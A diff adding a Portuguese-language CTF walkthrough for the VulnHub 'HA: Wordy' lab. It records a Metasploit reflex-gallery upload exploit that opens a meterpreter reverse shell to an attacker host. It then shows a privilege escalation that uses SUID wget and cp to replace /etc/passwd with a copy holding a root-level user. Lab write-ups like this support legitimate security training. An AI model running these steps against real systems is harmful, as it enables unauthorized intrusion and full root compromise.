@@ -1,0 +1,188 @@
+# Netdiscover
+192.168.1.104
+
+# Scanning
+PORT   STATE SERVICE
+80/tcp open  http
+
+# Serviços:
+Apache/2.4.29 (Ubuntu) 
+
+# Nota encontrada
+/notes.txt
+You Need to ZIP Your Wayout
+Você precisa compactar seu wayout
+
+### Wordpress
+http://192.168.1.104/wordpress/
+http://192.168.1.104/wordpress/wp-login.php
+
+# Versão
+WordPress version 5.2.7 identified (Latest, released on 2020-06-10).
+
+# Tema
+WordPress theme in use: twentysixteen version: 2.2
+
+# Usuários
+# Criado lista de usuários users.txt.
+aarti
+admin
+
+# Plugins
+mail-masta - 1.0
+reflex-gallery - 3.1.3 (Exploit: https://www.exploit-db.com/exploits/36374 - unix/webapp/wp_reflexgallery_file_upload)
+site-editor - 1.1.1 (Exploit: https://www.exploit-db.com/exploits/40290)
+slideshow-gallery - 1.4.6
+wp-easycart-data - NID
+wp-support-plus-responsive-ticket-system - 7.1.3
+wp-symposium - 15.1
+
+=================================================================================================================================
+
+##### Flag 1. Reflex-Gallery - 3.1.3
+msf5 exploit(unix/webapp/wp_reflexgallery_file_upload) > options
+
+Module options (exploit/unix/webapp/wp_reflexgallery_file_upload):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS     192.168.1.104    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT      80               yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /wordpress       yes       The base path to the wordpress application
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.1.105    yes       The listen address (an interface may be specified)
+   LPORT  443              yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Reflex Gallery 3.1.3
+
+
+msf5 exploit(unix/webapp/wp_reflexgallery_file_upload) > exploit
+
+[*] Started reverse TCP handler on 192.168.1.105:443 
+[+] Our payload is at: CbYZzZxImrBCHig.php. Calling payload...
+[*] Calling payload...
+[*] Sending stage (38288 bytes) to 192.168.1.104
+[*] Meterpreter session 1 opened (192.168.1.105:443 -> 192.168.1.104:55866) at 2020-09-29 17:02:47 -0300
+[+] Deleted CbYZzZxImrBCHig.php
+meterpreter > shell
+Process 2387 created.
+Channel 0 created.
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+www-data@ubuntu:/var/www/html/wordpress/wp-content/uploads/2020/09$ cd /home	
+www-data@ubuntu:/home$ ls
+raj
+www-data@ubuntu:/home$ cd raj	
+www-data@ubuntu:/home/raj$ cat flag1.txt
+cat flag1.txt
+aHR0cHM6Ly93d3cuaGFja2luZ2FydGljbGVzLmlu
+
+# Escalonamento de privilégios
+find / -perm -u=s -type f 2>/dev/null
+/usr/sbin/pppd
+/usr/bin/chfn
+/usr/bin/pkexec
+/usr/bin/passwd
+/usr/bin/sudo
+/usr/bin/arping
+/usr/bin/wget <--- permite baixar o o novo "passwd" modificado.
+/usr/bin/newgrp
+/usr/bin/chsh
+/usr/bin/traceroute6.iputils
+/usr/bin/gpasswd
+/usr/bin/vmware-user-suid-wrapper
+/usr/lib/xorg/Xorg.wrap
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/lib/snapd/snap-confine
+/bin/fusermount
+/bin/umount
+/bin/mount
+/bin/ping
+/bin/cp <--- permite substituir o arquivo "/etc/passwd".
+/bin/su
+
+# Criação de senha para atribuição de usuário no /etc/passwd.
+openssl passwd -1 -salt spike 13371337
+$1$spike$CxutB1qK2e4GnxLGmlXyJ.
+
+# Criado copia do arquivo /etc/passwd, adicionando o novo usuário "spike".
+spike:$1$spike$CxutB1qK2e4GnxLGmlXyJ.:0:0:root:/root:/bin/bash
+
+# Download e substituição do /etc/passwd original pelo modificado.
+www-data@ubuntu:/tmp$ wget http://192.168.1.105/passwd
+wget http://192.168.1.105/passwd
+--2020-09-29 13:51:35--  http://192.168.1.105/passwd
+Connecting to 192.168.1.105:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 2563 (2.5K)
+Saving to: 'passwd'
+
+passwd              100%[===================>]   2.50K  --.-KB/s    in 0s      
+
+2020-09-29 13:51:35 (27.1 MB/s) - 'passwd' saved [2563/2563]
+
+www-data@ubuntu:/tmp$ ls
+passwd
+www-data@ubuntu:/tmp$ cp passwd /etc/passwd
+
+www-data@ubuntu:/tmp$ su spike
+Password: 13371337
+
+root@ubuntu:/tmp# cd /root
+root@ubuntu:~# ls
+proof.txt
+
+root@ubuntu:~# cat proof.txt	
+cat proof.txt
+_________________________________________________________________________
+ _____     _   _   U _____ u     U _____ u   _   _       ____     	|	
+ |_ " _|   |'| |'|  \| ___"|/     \| ___"|/  | \ |"|     |  _"\   	|
+   | |    /| |_| |\  |  _|"        |  _|"   <|  \| |>   /| | | |  	|	
+  /| |\   U|  _  |u  | |___        | |___   U| |\  |u   U| |_| |\ 	|
+ u |_|U    |_| |_|   |_____|       |_____|   |_| \_|     |____/ u 	|
+ _// \\_   //   \\   <<   >>       <<   >>   ||   \\,-.   |||_    	|
+(__) (__) (_") ("_) (__) (__)     (__) (__)  (_")  (_/   (__)_)   	|
+									|
+									|
+!! Congrats you have finished this task !!				|
+									|
+Contact us here:							|
+									|
+Hacking Articles : https://twitter.com/rajchandel/			|
+									|
+									|
++-+-+-+-+-+ +-+-+-+-+-+-+-+						|
+ |E|n|j|o|y| |H|A|C|K|I|N|G|						|
+ +-+-+-+-+-+ +-+-+-+-+-+-+-+						|
+________________________________________________________________________|
+
+
+==========================================================================================================================
+
+Links:
+https://www.vulnhub.com/entry/ha-wordy,363/
+https://github.com/hamkovic/Mail-Masta-Wordpress-Plugin-SQL-Injection-Vulnerability
+https://www.exploit-db.com/exploits/36374
+https://github.com/JohnTroony/php-webshells
+https://lenonleite.com.br/2016/12/13/wp-support-plus-responsive-ticket-system-wordpress-plugin-sql-injection/
+https://www.exploit-db.com/exploits/41006
+https://www.exploit-db.com/exploits/40939
+https://www.acunetix.com/vulnerabilities/web/wordpress-plugin-reflex-gallery-arbitrary-file-upload-3-1-3/
+
